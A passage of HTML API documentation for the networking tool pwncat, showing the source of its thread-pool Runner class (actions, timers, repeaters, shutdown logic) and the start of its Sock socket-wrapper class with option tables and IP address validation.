                    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

            <span class="hljs-comment"># [2/2] Normal shutdown for non-daemon threads</span>
            <span class="hljs-keyword">else</span>:
                <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> self.__threads:
                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__threads[key].is_alive() <span
                                    class="hljs-keyword">or</span> self.__ssig.has_terminate():
                        <span class="hljs-keyword">for</span> interrupt <span class="hljs-keyword">in</span> self.__actions[key].interrupts:
                            <span class="hljs-comment"># [1/3] Call external interrupters</span>
                            self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                                <span class="hljs-string">"Call INTERRUPT: %s.%s() for %s"</span>,
                                getattr(interrupt, <span class="hljs-string">"__self__"</span>).__class__.__name__,
                                interrupt.__name__,
                                self.__threads[key].getName(),
                            )
                            interrupt()
                            <span class="hljs-comment"># [2/3] All blocking events inside the threads are gone, now join them</span>
                            <span class="hljs-keyword">try</span>:
                                self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                                    <span class="hljs-string">"Joining %s"</span>, self.__threads[key].getName()
                                )
                                <span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> The thread.join() operating will also block the signal</span>
                                <span class="hljs-comment"># handler if we try to join too many threads at once.</span>
                                self.__threads[key].join()
                                self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                                    <span class="hljs-string">"Joined %s"</span>, self.__threads[key].getName()
                                )
                            <span class="hljs-keyword">except</span> RuntimeError:
                                <span class="hljs-keyword">pass</span>
            <span class="hljs-comment"># If all threads are done, also stop</span>
            <span class="hljs-keyword">if</span> all([<span class="hljs-keyword">not</span> self.__threads[key].is_alive() <span
                                    class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> self.__threads]):
                self.log.trace(<span class="hljs-string">"All threads dead - shutting down."</span>)  <span
                                    class="hljs-comment"># type: ignore</span>
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            <span class="hljs-keyword">if</span> check_stop():
                sys.exit(<span class="hljs-number">0</span>)
            <span class="hljs-comment"># Need a timeout to not skyrocket the CPU</span>
            <span class="hljs-keyword">if</span> sys.version_info &lt; (<span
                                    class="hljs-number">3</span>, <span class="hljs-number">3</span>):
                <span class="hljs-comment"># Signal Handler in Python &lt; 3.3 is broken and might not catch on</span>
                <span class="hljs-comment"># a too small timeout invervall</span>
                time.sleep(<span class="hljs-number">0.5</span>)
            <span class="hljs-keyword">else</span>:
                time.sleep(<span class="hljs-number">0.01</span>)</code></pre>
                    </details>
                    <h3>Methods</h3>
                    <dl>
                        <dt id="pwncat.Runner.add_action"><code class="name flex">
                            <span>def <span class="ident">add_action</span></span>(<span>self, name, action)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Add a function to the producer/consumer thread pool
                                runner.</p>
                                <h2 id="args">Args</h2>
                                <dl>
                                    <dt><strong><code>name</code></strong> :<code>str</code></dt>
                                    <dd>The name for the added action (will be used for logging the
                                        tread name).
                                    </dd>
                                    <dt><strong><code>action</code></strong> :<code><a
                                            href="https://pwncat.org/pwncat.api.html#pwncat.DsRunnerAction"
                                            title="pwncat.DsRunnerAction">DsRunnerAction</a></code>
                                    </dt>
                                    <dd>Instance of DSRunnerAction.</dd>
                                </dl>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">add_action</span>(<span
                                        class="hljs-params">self, name, action</span>):</span>
    <span class="hljs-comment"># type: (str, DsRunnerAction) -&gt; None</span>
    <span class="hljs-string">"""Add a function to the producer/consumer thread pool runner.

    Args:
        name (str): The name for the added action (will be used for logging the tread name).
        action (DsRunnerAction): Instance of DSRunnerAction.
    """</span>
    self.__actions[name] = action</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.Runner.add_repeater"><code class="name flex">
                            <span>def <span class="ident">add_repeater</span></span>(<span>self, name, repeater)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Add a function to the repeater thread pool
                                runner.</p>
                                <h2 id="args">Args</h2>
                                <dl>
                                    <dt><strong><code>name</code></strong> :<code>str</code></dt>
                                    <dd>The name for the added repeater (will be used for logging
                                        the thread name).
                                    </dd>
                                    <dt><strong><code>repeater</code></strong> :<code><a
                                            href="https://pwncat.org/pwncat.api.html#pwncat.DsRunnerRepeater"
                                            title="pwncat.DsRunnerRepeater">DsRunnerRepeater</a></code>
                                    </dt>
                                    <dd>Instance of DsRunnerRepeater.</dd>
                                </dl>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">add_repeater</span>(<span
                                        class="hljs-params">self, name, repeater</span>):</span>
    <span class="hljs-comment"># type: (str, DsRunnerRepeater) -&gt; None</span>
    <span class="hljs-string">"""Add a function to the repeater thread pool runner.

    Args:
        name (str): The name for the added repeater (will be used for logging the thread name).
        repeater (DsRunnerRepeater): Instance of DsRunnerRepeater.
    """</span>
    self.__repeaters[name] = repeater</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.Runner.add_timer"><code class="name flex">
                            <span>def <span class="ident">add_timer</span></span>(<span>self, name, timer)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Add a function to the timer thread pool runner.</p>
                                <h2 id="args">Args</h2>
                                <dl>
                                    <dt><strong><code>name</code></strong> :<code>str</code></dt>
                                    <dd>The name for the added timer (will be used for logging the
                                        thread name).
                                    </dd>
                                    <dt><strong><code>timer</code></strong> :<code><a
                                            href="https://pwncat.org/pwncat.api.html#pwncat.DsRunnerTimer"
                                            title="pwncat.DsRunnerTimer">DsRunnerTimer</a></code>
                                    </dt>
                                    <dd>Instance of DsRunnerTimer.</dd>
                                </dl>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">add_timer</span>(<span
                                        class="hljs-params">self, name, timer</span>):</span>
    <span class="hljs-comment"># type: (str, DsRunnerTimer) -&gt; None</span>
    <span class="hljs-string">"""Add a function to the timer thread pool runner.

    Args:
        name (str): The name for the added timer (will be used for logging the thread name).
        timer (DsRunnerTimer): Instance of DsRunnerTimer.
    """</span>
    self.__timers[name] = timer</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.Runner.run"><code class="name flex">
                            <span>def <span class="ident">run</span></span>(<span>self)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Run threaded pwncat I/O modules.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span
                                        class="hljs-title">run</span>(<span
                                        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; None</span>
    <span class="hljs-string">"""Run threaded pwncat I/O modules."""</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_action</span>(<span
            class="hljs-params">
        name,  <span class="hljs-comment"># type: str</span>
        producer,  <span class="hljs-comment"># type: DsCallableProducer</span>
        consumer,  <span class="hljs-comment"># type: Callable[[bytes], None]</span>
        transformers,  <span class="hljs-comment"># type: List[Transform]</span>
        code,  <span class="hljs-comment"># type: Optional[Union[str, bytes, CodeType]]</span>
    </span>):</span>
        <span class="hljs-comment"># type: (...) -&gt; None</span>
        <span class="hljs-string">"""Producer/consumer run function to be thrown into a thread.

        Args:
            name (str): Name for logging output.
            producer (function): A generator function which yields data.
            consumer (function): A callback which consumes data from the generator.
            transformers ([function]): List of transformer functions applied before consumer.
            code (ast.AST): User-supplied python code with a transform(data) -&gt; str function.
        """</span>
        self.log.trace(<span class="hljs-string">"[%s] Producer Start"</span>, name)  <span
                                            class="hljs-comment"># type: ignore</span>
        <span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> producer.function(*producer.args, **producer.kwargs):
            self.log.trace(<span class="hljs-string">"[%s] Producer received: %s"</span>, name, repr(data))  <span
                                            class="hljs-comment"># type: ignore</span>

            <span class="hljs-comment"># [1/3] Transform data before sending it to the consumer</span>
            <span class="hljs-keyword">if</span> transformers:
                <span class="hljs-keyword">for</span> transformer <span
                                            class="hljs-keyword">in</span> transformers:
                    data = transformer.transform(data)
                self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                    <span class="hljs-string">"[%s] Producer data after transformers: %s"</span>, name, repr(data)
                )

            <span class="hljs-comment"># [2/3] Apply custom user-supplied code transformations</span>
            <span class="hljs-keyword">if</span> code <span class="hljs-keyword">is</span> <span
                                            class="hljs-keyword">not</span> <span
                                            class="hljs-literal">None</span>:
                self.log.debug(
                    <span class="hljs-string">"[%s] Executing user supplied transform(data, pse) -&gt; data function"</span>, name
                )
                pse = self.__pse
                <span class="hljs-comment"># Add current message to PSE store</span>
                <span class="hljs-keyword">if</span> name <span class="hljs-keyword">in</span> self.__pse.messages:
                    self.__pse.messages[name] = self.__pse.messages[name] + [data]
                <span class="hljs-keyword">else</span>:
                    self.__pse.messages[name] = [data]
                <span class="hljs-comment"># Execute script code</span>
                exec(code, {}, locals())  <span
                                            class="hljs-comment"># pylint: disable=exec-used</span>
                data = locals()[<span class="hljs-string">"transform"</span>](data, pse)

                self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                    <span class="hljs-string">"[%s] Producer data after user supplied transformer: %s"</span>, name, repr(data)
                )

            <span class="hljs-comment"># [3/3] Consume it</span>
            consumer(data)
        self.log.trace(<span class="hljs-string">"[%s] Producer Stop"</span>, name)  <span
                                            class="hljs-comment"># type: ignore</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_timer</span>(<span
            class="hljs-params">name, action, intvl, ssig, *args, **kwargs</span>):</span>
        <span class="hljs-comment"># type: (str, Callable[..., None], int, InterruptHandler, Any, Any) -&gt; None</span>
        <span class="hljs-string">"""Timer run function to be thrown into a thread (Execs periodic tasks).

        Args:
            name (str):        Name for logging output
            action (function): Function to be called in a given intervall
            intvl (float):     Intervall at which the action function will be called
            ssig (InterruptHandler): Instance of InterruptHandler
            args (*args):      *args for action func
            kwargs (**kwargs): **kwargs for action func
        """</span>
        self.log.trace(<span class="hljs-string">"[%s] Timer Start (exec every %f sec)"</span>, name, intvl)  <span
                                            class="hljs-comment"># type: ignore</span>
        time_last = int(time.time())
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            <span class="hljs-keyword">if</span> ssig.has_terminate():
                self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                    <span class="hljs-string">"TERMINATE signal ACK for timer action [%s]"</span>, name
                )
                <span class="hljs-keyword">return</span>
            time_now = int(time.time())
            <span class="hljs-keyword">if</span> time_now &gt; time_last + intvl:
                self.log.debug(<span class="hljs-string">"[%s] Executing timed function"</span>, time_now)
                action(*args, **kwargs)
                time_last = time_now  <span class="hljs-comment"># Reset previous time</span>
            time.sleep(<span class="hljs-number">0.1</span>)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_repeater</span>(<span
            class="hljs-params">name, action, repeat, pause, ssig, *args, **kwargs</span>):</span>
        <span class="hljs-comment"># type: (str, Callable[..., None], int, float, InterruptHandler, Any, Any) -&gt; None</span>
        <span class="hljs-string">"""Repeater run function to be thrown into a thread (Execs periodic tasks).

        Args:
            name (str):        Name for logging output
            action (function): Function to be called
            repeat (int):      Repeat the function so many times before quitting
            pause (float):     Pause between repeated calls
            ssig (InterruptHandler): Instance of InterruptHandler
            args (*args):      *args for action func
            kwargs (**kwargs): **kwargs for action func
        """</span>
        cycles = <span class="hljs-number">1</span>
        self.log.trace(<span class="hljs-string">"Repeater Start (%d/%d)"</span>, cycles, repeat)  <span
                                            class="hljs-comment"># type: ignore</span>
        <span class="hljs-keyword">while</span> cycles &lt;= repeat:
            <span class="hljs-keyword">if</span> ssig.has_terminate():
                self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                    <span class="hljs-string">"TERMINATE signal ACK for repeater action [%s]"</span>, name
                )
                <span class="hljs-keyword">return</span>
            self.log.debug(<span class="hljs-string">"Executing repeated function (%d/%d)"</span>, cycles, repeat)
            action(*args, **kwargs)
            cycles += <span class="hljs-number">1</span>
            time.sleep(pause)

    <span class="hljs-comment"># [1/3] Start available action in a thread</span>
    <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> self.__actions:
        <span class="hljs-keyword">if</span> self.__ssig.has_terminate():
            self.log.trace(<span class="hljs-string">"TERMINATE signal ACK for Runner.run [1]: [%s]"</span>, key)  <span
                                            class="hljs-comment"># type: ignore</span>
            <span class="hljs-keyword">break</span>
        <span class="hljs-comment"># Create Thread object</span>
        thread = threading.Thread(
            target=run_action,
            name=key,
            args=(
                key,
                self.__actions[key].producer,
                self.__actions[key].consumer,
                self.__actions[key].transformers,
                self.__actions[key].code,
            ),
        )
        <span class="hljs-comment"># Daemon threads are easier to kill</span>
        thread.daemon = self.__actions[key].daemon_thread

        <span class="hljs-comment"># Add delay if threads cannot be started</span>
        delay = <span class="hljs-number">0.0</span>
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            <span class="hljs-keyword">if</span> self.__ssig.has_terminate():
                self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                    <span class="hljs-string">"TERMINATE signal ACK for Runner.run [2]: [%s]"</span>, key
                )
                <span class="hljs-keyword">break</span>
            <span class="hljs-keyword">try</span>:
                <span class="hljs-comment"># Do not call any logging functions in here as it will</span>
                <span class="hljs-comment"># cause a deadlock for Python2</span>
                <span class="hljs-comment"># Start and break the loop upon success to go to the next thread to start</span>
                thread.start()
                <span class="hljs-keyword">break</span>
            <span class="hljs-keyword">except</span> (RuntimeError, Exception):  <span
                                            class="hljs-comment"># pylint: disable=broad-except</span>
                delay += <span class="hljs-number">0.1</span>
                time.sleep(delay)  <span class="hljs-comment"># Give the system some time to release open fd's</span>
        self.__threads[key] = thread

    <span class="hljs-comment"># [2/3] Start available timers in a thread</span>
    <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> self.__timers:
        <span class="hljs-keyword">if</span> self.__ssig.has_terminate():
            self.log.trace(<span class="hljs-string">"TERMINATE signal ACK for Runner.run [2]: [%s]"</span>, key)  <span
                                            class="hljs-comment"># type: ignore</span>
            <span class="hljs-keyword">break</span>
        <span class="hljs-comment"># Create Thread object</span>
        thread = threading.Thread(
            target=run_timer,
            name=key,
            args=(
                key,
                self.__timers[key].action,
                self.__timers[key].intvl,
                self.__timers[key].ssig,
            )
            + self.__timers[key].args,
            kwargs=self.__timers[key].kwargs,
        )
        thread.daemon = <span class="hljs-literal">False</span>
        thread.start()

    <span class="hljs-comment"># [3/3] Start available repeaters in a thread</span>
    <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> self.__repeaters:
        <span class="hljs-keyword">if</span> self.__ssig.has_terminate():
            self.log.trace(<span class="hljs-string">"TERMINATE signal ACK for Runner.run [3]: [%s]"</span>, key)  <span
                                            class="hljs-comment"># type: ignore</span>
            <span class="hljs-keyword">break</span>
        <span class="hljs-comment"># Create Thread object</span>
        thread = threading.Thread(
            target=run_repeater,
            name=key,
            args=(
                key,
                self.__repeaters[key].action,
                self.__repeaters[key].repeat,
                self.__repeaters[key].pause,
                self.__repeaters[key].ssig,
            )
            + self.__repeaters[key].args,
            kwargs=self.__repeaters[key].kwargs,
        )
        thread.daemon = <span class="hljs-literal">False</span>
        thread.start()

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_stop</span>():</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""Stop threads."""</span>
        <span class="hljs-comment"># [1/2] Fast shutdown</span>
        <span class="hljs-comment"># For Python &lt; 3.3 we are unable to detect Ctrl+c signal during thread.join()</span>
        <span class="hljs-comment"># in a fast loop. Also for port-scan we will have thousands of threads that need</span>
        <span class="hljs-comment"># to be joined and the signal handler is unable to abort the whole program during that</span>
        <span class="hljs-comment"># time. Outcome is it would take a few minutes to abort during port scan.</span>
        <span class="hljs-comment"># The fix is to use a "faster" method to kill the threads.</span>
        <span class="hljs-comment"># 1. The port scanner threads need to be started in daemon mode</span>
        <span class="hljs-comment"># 2. the fast_quit param to Runner() must be set to True</span>
        <span class="hljs-keyword">if</span> self.__fast_quit:
            <span class="hljs-keyword">if</span> self.__ssig.has_terminate():
                self.log.trace(<span class="hljs-string">"Fast quit - shutting down."</span>)  <span
                                            class="hljs-comment"># type: ignore</span>
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

        <span class="hljs-comment"># [2/2] Normal shutdown for non-daemon threads</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> self.__threads:
                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__threads[key].is_alive() <span
                                            class="hljs-keyword">or</span> self.__ssig.has_terminate():
                    <span class="hljs-keyword">for</span> interrupt <span
                                            class="hljs-keyword">in</span> self.__actions[key].interrupts:
                        <span class="hljs-comment"># [1/3] Call external interrupters</span>
                        self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                            <span class="hljs-string">"Call INTERRUPT: %s.%s() for %s"</span>,
                            getattr(interrupt, <span class="hljs-string">"__self__"</span>).__class__.__name__,
                            interrupt.__name__,
                            self.__threads[key].getName(),
                        )
                        interrupt()
                        <span class="hljs-comment"># [2/3] All blocking events inside the threads are gone, now join them</span>
                        <span class="hljs-keyword">try</span>:
                            self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                                <span class="hljs-string">"Joining %s"</span>, self.__threads[key].getName()
                            )
                            <span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> The thread.join() operating will also block the signal</span>
                            <span class="hljs-comment"># handler if we try to join too many threads at once.</span>
                            self.__threads[key].join()
                            self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                                <span class="hljs-string">"Joined %s"</span>, self.__threads[key].getName()
                            )
                        <span class="hljs-keyword">except</span> RuntimeError:
                            <span class="hljs-keyword">pass</span>
        <span class="hljs-comment"># If all threads are done, also stop</span>
        <span class="hljs-keyword">if</span> all([<span class="hljs-keyword">not</span> self.__threads[key].is_alive() <span
                                            class="hljs-keyword">for</span> key <span
                                            class="hljs-keyword">in</span> self.__threads]):
            self.log.trace(<span class="hljs-string">"All threads dead - shutting down."</span>)  <span
                                            class="hljs-comment"># type: ignore</span>
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        <span class="hljs-keyword">if</span> check_stop():
            sys.exit(<span class="hljs-number">0</span>)
        <span class="hljs-comment"># Need a timeout to not skyrocket the CPU</span>
        <span class="hljs-keyword">if</span> sys.version_info &lt; (<span
                                            class="hljs-number">3</span>, <span class="hljs-number">3</span>):
            <span class="hljs-comment"># Signal Handler in Python &lt; 3.3 is broken and might not catch on</span>
            <span class="hljs-comment"># a too small timeout invervall</span>
            time.sleep(<span class="hljs-number">0.5</span>)
        <span class="hljs-keyword">else</span>:
            time.sleep(<span class="hljs-number">0.01</span>)</code></pre>
                            </details>
                        </dd>
                    </dl>
                </dd>
                <dt id="pwncat.Sock"><code class="flex name class">
                    <span>class <span class="ident">Sock</span></span>
                </code></dt>
                <dd>
                    <div class="desc"><p>Thread-safe singleton Socket wrapper to emulate a module
                        within the same file.</p></div>
                    <details class="source">
                        <summary>
                            <span>Expand source code</span>
                        </summary>
                        <pre><code class="python hljs"><span class="hljs-class"><span
                                class="hljs-keyword">class</span> <span
                                class="hljs-title">Sock</span>(<span class="hljs-params">_Singleton(<span
                                class="hljs-params"><span class="hljs-string">"SingletonMeta"</span>, (<span
                                class="hljs-params">object,</span>), {}</span>)</span>):</span>  <span
                                class="hljs-comment"># type: ignore</span>
    <span class="hljs-string">"""Thread-safe singleton Socket wrapper to emulate a module within the same file."""</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        self.__log = logging.getLogger(__name__)

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Private constants</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># For Internet Protocol v4 the value consists of an integer, the least</span>
    <span class="hljs-comment"># significant 8 bits of which represent the value of the TOS octet in IP</span>
    <span class="hljs-comment"># packets sent by the socket. RFC 1349 defines the TOS values as follows:</span>
    __IP_TOS = {
        <span class="hljs-string">"mincost"</span>: <span class="hljs-number">0x02</span>,
        <span class="hljs-string">"lowcost"</span>: <span class="hljs-number">0x02</span>,
        <span class="hljs-string">"reliability"</span>: <span class="hljs-number">0x04</span>,
        <span class="hljs-string">"throughput"</span>: <span class="hljs-number">0x08</span>,
        <span class="hljs-string">"lowdelay"</span>: <span class="hljs-number">0x10</span>,
    }

    <span class="hljs-comment"># Human readable address families</span>
    __AF_HUMAN = {
        int(socket.AF_INET): <span class="hljs-string">"IPv4"</span>,
        int(socket.AF_INET6): <span class="hljs-string">"IPv6"</span>,
    }

    <span class="hljs-comment"># Human readable socket types</span>
    __ST_HUMAN = {
        int(socket.SOCK_STREAM): <span class="hljs-string">"TCP"</span>,
        int(socket.SOCK_DGRAM): <span class="hljs-string">"UDP"</span>,
    }

    <span class="hljs-comment"># https://hg.python.org/cpython/file/3.5/Modules/socketmodule.c</span>
    __SOCK_OPTS = {
        <span class="hljs-string">"Sock"</span>: [
            <span class="hljs-string">"SO_DEBUG"</span>,
            <span class="hljs-string">"SO_ACCEPTCONN"</span>,
            <span class="hljs-string">"SO_REUSEADDR"</span>,
            <span class="hljs-string">"SO_EXCLUSIVEADDRUSE"</span>,
            <span class="hljs-string">"SO_KEEPALIVE"</span>,
            <span class="hljs-string">"SO_DONTROUTE"</span>,
            <span class="hljs-string">"SO_BROADCAST"</span>,
            <span class="hljs-string">"SO_USELOOPBACK"</span>,
            <span class="hljs-string">"SO_LINGER"</span>,
            <span class="hljs-string">"SO_OOBINLINE"</span>,
            <span class="hljs-string">"SO_REUSEPORT"</span>,
            <span class="hljs-string">"SO_SNDBUF"</span>,
            <span class="hljs-string">"SO_RCVBUF"</span>,
            <span class="hljs-string">"SO_SNDLOWAT"</span>,
            <span class="hljs-string">"SO_RCVLOWAT"</span>,
            <span class="hljs-string">"SO_SNDTIMEO"</span>,
            <span class="hljs-string">"SO_RCVTIMEO"</span>,
            <span class="hljs-string">"SO_ERROR"</span>,
            <span class="hljs-string">"SO_TYPE"</span>,
            <span class="hljs-string">"SO_SETFIB"</span>,
            <span class="hljs-string">"SO_PASSCRED"</span>,
            <span class="hljs-string">"SO_PEERCRED"</span>,
            <span class="hljs-string">"LOCAL_PEERCRED"</span>,
            <span class="hljs-string">"SO_BINDTODEVICE"</span>,
            <span class="hljs-string">"SO_PRIORITY"</span>,
            <span class="hljs-string">"SO_MARK"</span>,
        ],
        <span class="hljs-string">"IPv4"</span>: [
            <span class="hljs-string">"IP_OPTIONS"</span>,
            <span class="hljs-string">"IP_HDRINCL"</span>,
            <span class="hljs-string">"IP_TOS"</span>,
            <span class="hljs-string">"IP_TTL"</span>,
            <span class="hljs-string">"IP_RECVOPTS"</span>,
            <span class="hljs-string">"IP_RECVRETOPTS"</span>,
            <span class="hljs-string">"IP_RECVDSTADDR"</span>,
            <span class="hljs-string">"IP_RETOPTS"</span>,
            <span class="hljs-string">"IP_MULTICAST_IF"</span>,
            <span class="hljs-string">"IP_MULTICAST_TTL"</span>,
            <span class="hljs-string">"IP_MULTICAST_LOOP"</span>,
            <span class="hljs-string">"IP_ADD_MEMBERSHIP"</span>,
            <span class="hljs-string">"IP_DROP_MEMBERSHIP"</span>,
            <span class="hljs-string">"IP_DEFAULT_MULTICAST_TTL"</span>,
            <span class="hljs-string">"IP_DEFAULT_MULTICAST_LOOP"</span>,
            <span class="hljs-string">"IP_MAX_MEMBERSHIPS"</span>,
            <span class="hljs-string">"IP_TRANSPARENT"</span>,
        ],
        <span class="hljs-string">"IPv6"</span>: [
            <span class="hljs-string">"IPV6_JOIN_GROUP"</span>,
            <span class="hljs-string">"IPV6_LEAVE_GROUP"</span>,
            <span class="hljs-string">"IPV6_MULTICAST_HOPS"</span>,
            <span class="hljs-string">"IPV6_MULTICAST_IF"</span>,
            <span class="hljs-string">"IPV6_MULTICAST_LOOP"</span>,
            <span class="hljs-string">"IPV6_UNICAST_HOPS"</span>,
            <span class="hljs-string">"IPV6_V6ONLY"</span>,
            <span class="hljs-string">"IPV6_CHECKSUM"</span>,
            <span class="hljs-string">"IPV6_DONTFRAG"</span>,
            <span class="hljs-string">"IPV6_DSTOPTS"</span>,
            <span class="hljs-string">"IPV6_HOPLIMIT"</span>,
            <span class="hljs-string">"IPV6_HOPOPTS"</span>,
            <span class="hljs-string">"IPV6_NEXTHOP"</span>,
            <span class="hljs-string">"IPV6_PATHMTU"</span>,
            <span class="hljs-string">"IPV6_PKTINFO"</span>,
            <span class="hljs-string">"IPV6_RECVDSTOPTS"</span>,
            <span class="hljs-string">"IPV6_RECVHOPLIMIT"</span>,
            <span class="hljs-string">"IPV6_RECVHOPOPTS"</span>,
            <span class="hljs-string">"IPV6_RECVPKTINFO"</span>,
            <span class="hljs-string">"IPV6_RECVRTHDR"</span>,
            <span class="hljs-string">"IPV6_RECVTCLASS"</span>,
            <span class="hljs-string">"IPV6_RTHDR"</span>,
            <span class="hljs-string">"IPV6_RTHDRDSTOPTS"</span>,
            <span class="hljs-string">"IPV6_RTHDR_TYPE_0"</span>,
            <span class="hljs-string">"IPV6_RECVPATHMTU"</span>,
            <span class="hljs-string">"IPV6_TCLASS"</span>,
            <span class="hljs-string">"IPV6_USE_MIN_MTU"</span>,
        ],
        <span class="hljs-string">"TCP"</span>: [
            <span class="hljs-string">"TCP_NODELAY"</span>,
            <span class="hljs-string">"TCP_MAXSEG"</span>,
            <span class="hljs-string">"TCP_CORK"</span>,
            <span class="hljs-string">"TCP_KEEPIDLE"</span>,
            <span class="hljs-string">"TCP_KEEPINTVL"</span>,
            <span class="hljs-string">"TCP_KEEPCNT"</span>,
            <span class="hljs-string">"TCP_SYNCNT"</span>,
            <span class="hljs-string">"TCP_LINGER2"</span>,
            <span class="hljs-string">"TCP_DEFER_ACCEPT"</span>,
            <span class="hljs-string">"TCP_WINDOW_CLAMP"</span>,
            <span class="hljs-string">"TCP_INFO"</span>,
            <span class="hljs-string">"TCP_QUICKACK"</span>,
            <span class="hljs-string">"TCP_FASTOPEN"</span>,
        ],
    }

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Static methods</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_ipv6_address</span>(<span
            class="hljs-params">host</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; bool</span>
        <span class="hljs-string">"""Check if a given str is a valid IPv6 address."""</span>
        <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> check for link-local addresses (start with: fe80)</span>
        <span class="hljs-comment"># https://stackoverflow.com/questions/3801701</span>

        <span class="hljs-comment"># [1/4] socket.inet_pton</span>
        <span class="hljs-keyword">if</span> hasattr(socket, <span
                                    class="hljs-string">"inet_pton"</span>):
            <span class="hljs-keyword">try</span>:
                socket.inet_pton(socket.AF_INET6, host)
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
            <span class="hljs-keyword">except</span> socket.error:
                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

        <span class="hljs-comment"># [2/4] optional module: ipaddress</span>
        <span class="hljs-keyword">try</span>:
            addr = unicode(host)  <span class="hljs-comment"># type: ignore</span>
        <span class="hljs-keyword">except</span> NameError:
            addr = host
        <span class="hljs-keyword">try</span>:
            <span class="hljs-keyword">try</span>:
                ipaddress.IPv6Address(addr)
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
            <span class="hljs-keyword">except</span> ipaddress.AddressValueError:
                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
        <span class="hljs-keyword">except</span> NameError:
            <span class="hljs-keyword">pass</span>

        <span class="hljs-comment"># [3/4] regex</span>
        <span class="hljs-comment"># This is a poor mans solution, but we only want to know if it</span>
        <span class="hljs-comment"># is on the format of IPv6 and not if it is a valid IPv6. The</span>
        <span class="hljs-comment"># validation will be figured out during connect()</span>
        reg = <span class="hljs-string">r"^([a-f0-9]{0,4}:){5}[a-f0-9]{0,4}$"</span>
        <span class="hljs-keyword">if</span> re.match(reg, host):
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

        <span class="hljs-comment"># [4/4] Nope</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_ipv4_address</span>(<span
            class="hljs-params">host</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; bool</span>
        <span class="hljs-string">"""Check if a given str is a valid IPv4 address."""</span>
        <span class="hljs-comment"># [1/5] socket.inet_aton</span>
        <span class="hljs-keyword">if</span> hasattr(socket, <span
                                    class="hljs-string">"inet_aton"</span>):
            <span class="hljs-keyword">try</span>:
